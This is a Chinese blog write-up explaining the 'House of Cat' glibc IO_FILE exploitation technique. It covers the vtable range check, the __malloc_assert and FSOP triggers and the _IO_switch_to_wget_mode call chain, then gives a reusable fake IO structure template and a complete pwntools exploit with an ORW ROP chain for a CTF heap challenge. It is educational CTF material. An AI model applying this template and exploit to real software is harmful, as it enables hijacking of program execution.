---
title: 【IO_FILE】house of cat
index_img: img/article/house_of_cat/image-20221113210513266.png
excerpt: House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 _pointer_chk_guard的检测相关的IO函数的调用，转而调用_IO_wfile_jumps中的_IO_wfile_seekoff函数，然后进入到_IO_switch_to_wget_mode函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在FSOP的情况下也是可行的，只需修改虚表指针的偏移来调用_IO_wfile_seekoff即可（通常是结合__malloc_assert，改vtable为_IO_wfile_jumps+0x10）。
---

## 前言

House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 **_pointer_chk_guard**的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps**中的**_IO_wfile_seekoff**函数，然后进入到**_IO_switch_to_wget_mode**函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在**FSOP**的情况下也是可行的，只需修改虚表指针的偏移来调用**_IO_wfile_seekoff**即可（通常是结合**__malloc_assert**，改vtable为**_IO_wfile_jumps+0x10**）。

>本文为对CatF1y大佬提出的IO_FILE调用链的学习，原文链接：[House of cat新型glibc中IO利用手法解析 && 第六届强网杯House of cat详解](https://bbs.pediy.com/thread-273895.htm#msg_header_h1_0)

## 原理简介

### 利用条件

- 能够任意写一个可控地址（如large bin attack的任意写堆地址）
- 能够泄露libc和堆地址
- 能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。

### 利用原理

#### IO_FILE结构及利用

在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），当进入IO流时会根据vtable指针调用相关的IO函数，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。

#### vatable检查

```c
void _IO_vtable_check (void) attribute_hidden;
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    _IO_vtable_check ();
  return vtable;
}
```

其检查流程为：计算**_IO_vtable 段的长度（section_length)**，用当前虚表指针的地址减去**_IO_vtable 段的开始地址**，如果vtable相对于开始地址的偏移大于等于**section_length**，那么就会进入**_IO_vtable_check**进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入**_IO_vtable_check**函数后会触发`abort`。

但同时我们注意到一件事，这里对于vtable的地址检查并非是具体地址，而是一个范围。这样就给了攻击者可操作的空间，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。

#### __malloc_assert与FSOP

在glibc中存在一个函数`_malloc_assert`，其中会根据vtable表如`_IO_xxx_jumps`调用IO等相关函数；该函数最终会根据stderr这个IO结构体进行相关的IO操作

![image-20221113210513266](img/article/house_of_cat/image-20221113210513266.png)

代码如下：

```c
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
         const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
             __progname, __progname[0] ? ": " : "",
             file, line,
             function ? function : "", function ? ": " : "",
             assertion);
  fflush (stderr);
  abort ();
}
```

[house of kiwi]([【IO_FILE】House of kiwi - 鷺雨のBlog (loora1n.github.io)](https://loora1n.github.io/2022/10/27/[IO_FILE]House of kiwi/))提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个

> 1.topchunk的大小小于MINSIZE(0X20)
> 2.prev inuse位为0
> 3.old_top页未对齐

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
```

下面介绍另一种触发house of cat的方式FSOP:

程序中所有的`_IO_FILE `结构用`_chain`连接形成一个单链表，链表的头部则是`_IO_list_all`

FSOP就是通过劫持`_IO_list_all`的值（如large bin attack修改）来执行`_IO_flush_all_lockp`函数，这个函数会根据`_IO_list_all`刷新链表中的所有文件流，在libc中代码如下，其中会调用vtable中的IO函数_IO_OVERFLOW，根据我们上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链

```c
int
_IO_flush_all_lockp (int do_lock)
{
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
       ...
       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
        ...
  }
}
```

触发条件则是有三种情况

> FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。

#### 一种可行的IO调用链

在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。

```c
const struct _IO_jump_t _IO_wfile_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

其中_IO_wfile_seekoff函数代码如下

```c
off64_t
_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t result;
  off64_t delta, new_offset;
  long int count;
 
  if (mode == 0)
    return do_ftell_wide (fp);
  int must_be_exact = ((fp->_wide_data->_IO_read_base
            == fp->_wide_data->_IO_read_end)
               && (fp->_wide_data->_IO_write_base
               == fp->_wide_data->_IO_write_ptr));
#需要绕过was_writing的检测
  bool was_writing = ((fp->_wide_data->_IO_write_ptr
               > fp->_wide_data->_IO_write_base)
              || _IO_in_put_mode (fp));
 
  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;
......
}
```

其中fp结构体是我们可以伪造的(上面那个截图的rdi，为一个**堆地址**)，可以控制**fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base**来调用**_IO_switch_to_wget_mode**这个函数，继续跟进代码

```
int
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
  ......
}
```

而_IO_WOVERFLOW是glibc里定义的一个宏调用函数

```c
#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
```

对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码

```assembly
  0x7f4cae745d30 <_IO_switch_to_wget_mode>       endbr64
  0x7f4cae745d34 <_IO_switch_to_wget_mode+4>     mov    rax, qword ptr [rdi + 0xa0]
  0x7f4cae745d3b <_IO_switch_to_wget_mode+11>    push   rbx
  0x7f4cae745d3c <_IO_switch_to_wget_mode+12>    mov    rbx, rdi
  0x7f4cae745d3f <_IO_switch_to_wget_mode+15>    mov    rdx, qword ptr [rax + 0x20]
  0x7f4cae745d43 <_IO_switch_to_wget_mode+19>    cmp    rdx, qword ptr [rax + 0x18]
  0x7f4cae745d47 <_IO_switch_to_wget_mode+23>    jbe    _IO_switch_to_wget_mode+56 <_IO_switch_to_wget_mode+56> 
  0x7f4cae745d49 <_IO_switch_to_wget_mode+25>    mov    rax, qword ptr [rax + 0xe0]
  0x7f4cae745d50 <_IO_switch_to_wget_mode+32>    mov    esi, 0xffffffff
  0x7f4cae745d55 <_IO_switch_to_wget_mode+37>    call   qword ptr [rax + 0x18]
```

主要关注这几句，做了一下几点事情

- 将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为**rax1**。
- 将新赋值的[rax1+0x20]处的内容赋值给rdx。
- 将[rax1+0xe0]处的内容赋值给rax，称之为**rax2**。
- call调用[rax2+0x18]处的内容。

```assembly
0x7f4cae745d34 <_IO_switch_to_wget_mode+4>     mov    rax, qword ptr [rdi + 0xa0]
0x7f4cae745d3f <_IO_switch_to_wget_mode+15>    mov    rdx, qword ptr [rax + 0x20]
0x7f4cae745d49 <_IO_switch_to_wget_mode+25>    mov    rax, qword ptr [rax + 0xe0]
0x7f4cae745d55 <_IO_switch_to_wget_mode+37>    call   qword ptr [rax + 0x18]
```

而rdi现在是什么状态呢？gdb调试来看看

![image-20221113211825072](img/article/house_of_cat/image-20221113211825072.png)

可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，即**之前__IO_wfile_seekoff函数传入那个fp**，也是可控的。

在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在**开启沙箱**的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag**；如果**未开启沙箱**，则只需把**最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串**，就可执行system("/bin/sh")

#### fake_IO结构体需要绕过的检测

```c
_wide_data->_IO_read_ptr ！= _wide_data->_IO_read_end
_wide_data->_IO_write_ptr > _wide_data->_IO_write_base
/*如果_wide_data=fake_io_addr+0x30，其实也就是fp->_IO_save_base < f->_IO_backup_base
fp->_lock是一个可写地址（堆地址libc中的可写地址）*/
```

#### 攻击流程

![攻击流程图](img/article/house_of_cat/959842_JDJKTRK7GJUEUFR.png)

#### 模板

house of cat的模板，原理参照上图。伪造IO结构体时只需修改**fake_io_addr**地址，**_IO_save_end**为想要调用的函数，**_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）

```python
fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE+=p64(0)*7
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
```

## 例题：强网杯house of  cat

### 逆向分析

整体逆向思路类似于[chunqiuIOT]([i春秋春季赛-勇者巅峰-chunqiuIOT - 鷺雨のBlog (loora1n.github.io)](https://loora1n.github.io/2022/11/03/i春秋春季赛-勇者巅峰-chunqiuIOT/))那道题，也可以说是**IO_FILE升级版**，这里我们直接看核心的几个函数

![add](img/article/house_of_cat/image-20221113212407882.png)

![del](img/article/house_of_cat/image-20221113212432448.png)

![edit](img/article/house_of_cat/image-20221113212454297.png)

![show](img/article/house_of_cat/image-20221113212643434.png)

- 存在UAF漏洞
- 可以申请**0x470~0x418**大小的chunk
- 只有两次edit的机会，且长度为0x30
- show函数固定输出0x30长度的内容

### 沙盒

```shell
seccomp-tools dump ./houseofcat  
```

![image-20221110125159203](img/article/house_of_cat/image-20221110125159203.png)

只能使用orw，且限制了fd为0

### 利用

无法退出main函数，也没有exit等能造成FSOP的方式，但是stderr不在bss上而在libc中，可以在得到libc地址后large bin attack位于libc中的stderr，再在得到heap地址的基础上修改top chunk的size，这里用large bin attack修改。所以两次edit相当于给了两次large bin attack的机会，一次用来large bin attack stderr，一次用来large bin attack topchunk's size。另外由于对fd的检查，需要close(0)使flag文件的文件描述符为0,或者用mmap函数将flag映射读入。

- 泄露libc地址和堆地址
- large bin attack stderr
- large bin attack topchunk's size
- 伪造fake_IO
- 触发`__malloc_assert`, 进入`_IO_wfile_seekoff`转到`_IO_switch_to_wget_mode`
- setcontext执行rop链(orw需要注意fd应先`close(0)`)

### exp

```python
from pwn import *

# libc = ELF('/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
libc = ELF('./libc.so')
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

io = process('./houseofcat')
# io = remote('210.30.97.133',28065)

def p():
    gdb.attach(proc.pidof(io)[0],'b* (_IO_wfile_seekoff)')
    
def login():
    payload = "LOGIN | r00t QWB QWXFadmin"
    io.sendafter('mew mew mew~~~~~~\n',payload)
    # payload = "CAT | r00t QWB QWXF\xFF\xFF\xFF\xFF"
    
def add(idx,size,cont):
    io.sendafter('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF')
    io.sendlineafter('plz input your cat choice:\n',str(1))
    io.sendlineafter('plz input your cat idx:\n',str(idx))
    io.sendlineafter('plz input your cat size:\n',str(size))
    io.sendafter('plz input your content:\n',cont)
def delete(idx):
    io.sendafter('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF')
    io.sendlineafter('plz input your cat choice:\n', str(2))
    io.sendlineafter('plz input your cat idx:\n',str(idx))
def show(idx):
    io.sendafter('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF')
    io.sendlineafter('plz input your cat choice:\n', str(3))
    io.sendlineafter('plz input your cat idx:\n',str(idx))
def edit(idx,cont):
    io.sendafter('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF')
    io.sendlineafter('plz input your cat choice:\n', str(4))
    io.sendlineafter('plz input your cat idx:\n',str(idx))
    io.sendafter('plz input your content:\n', cont)
    

login()
# p()
add(0,0x420,'aaa')
add(1,0x430,'bbb')
add(2,0x418,'ccc')
# p()
delete(0)
add(3,0x440,'ddd')
show(0)

#libc_base
io.recvuntil('Context:\n')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x21a0d0
io.recv(10)
heapbase = u64(io.recv(6).ljust(8,b'\x00')) - 0x290
success("libc_base-->"+hex(libc_base))
success("heapbase-->"+hex(heapbase))
# p()
pop_rdi = libc_base + 0x000000000002a3e5 #: pop rdi ; ret
pop_rsi = libc_base + 0x000000000002be51 #: pop rsi ; ret
pop_rdx = libc_base + 0x000000000011f497 #: pop rdx ; pop r12 ; ret
pop_rax = libc_base + 0x0000000000045eb0 #: pop rax ; ret
ret=libc_base+0x0000000000029cd6
stderr=libc_base+libc.sym['stderr']
setcontext=libc_base+libc.sym['setcontext']
close=libc_base+libc.sym['close']
read=libc_base+libc.sym['read']
write=libc_base+libc.sym['write']
syscallret=libc_base+libc.search(asm('syscall\nret')).__next__()
success('syscall_ret-->'+hex(syscallret))

#fake IO
ioaddr=heapbase+0xb00
next_chain = 0
fake_IO_FILE = p64(0)*4
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(1)+p64(2)
fake_IO_FILE +=p64(heapbase+0xc18-0x68)#rdx
fake_IO_FILE +=p64(setcontext+61)#call addr
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heapbase+0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE +=p64(heapbase+0xb30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b'\x00')
fake_IO_FILE += p64(1)  # _mode = 1
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b'\x00')
fake_IO_FILE += p64(libc_base+0x2160d0)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(heapbase+0xb30+0x10)  # rax2
flagaddr=heapbase+0x17d0
payload1=fake_IO_FILE+p64(flagaddr)+p64(0)+p64(0)*5+p64(heapbase+0x2050)+p64(ret)

delete(2)
add(6,0x418,payload1)
delete(6)
# p()
#large bin attack stderr poiniter
edit(0,p64(libc_base+0x21a0d0)*2+p64(heapbase+0x290)+p64(stderr-0x20))
add(5,0x440,'aaaaa')
add(7,0x430,'flag')
add(8,0x430,'eee')

#rop
payload=p64(pop_rdi)+p64(0)+p64(close)\
    +p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscallret)\
        +p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx)+p64(0x50)+p64(0)+p64(read)\
            +p64(pop_rdi)+p64(1)+p64(write)
add(9,0x430,payload)
delete(5)
add(10,0x450,p64(0)+p64(1))
delete(8)
# p()

edit(5,p64(libc_base+0x21a0e0)*2+p64(heapbase+0x1370)+p64(heapbase+0x28e0-0x20+3))
#trigger __malloc_assert
io.sendafter('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
io.sendlineafter('plz input your cat choice:\n',str(1))
io.sendlineafter('plz input your cat idx:',str(11))
#gdb.attach(io,'b* (_IO_wfile_seekoff)')
io.sendlineafter('plz input your cat size:',str(0x450))  # add(11,0X450)
io.interactive()
```

